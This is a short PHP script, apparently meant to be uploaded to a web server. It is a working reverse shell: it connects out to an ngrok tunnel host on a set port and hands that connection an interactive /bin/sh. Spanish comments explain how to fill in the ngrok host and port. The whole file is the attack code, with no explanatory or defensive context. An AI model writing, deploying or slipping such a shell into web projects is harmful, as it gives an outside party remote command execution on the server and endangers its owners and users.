<?php
set_time_limit(0);
$ip = '0.tcp.sa.ngrok.io';   // La IP / host público que te dio ngrok
$port = 16445;           	// El puerto público que te dio ngrok

$sock = fsockopen($ip, $port);
if (!$sock) {
	die("No se pudo conectar al host $ip en el puerto $port");
}

$proc = proc_open('/bin/sh -i', array(
	0 => $sock,
	1 => $sock,
	2 => $sock
), $pipes);

if (!is_resource($proc)) {
	die("No se pudo iniciar el shell interactivo");
}

proc_close($proc);
?>
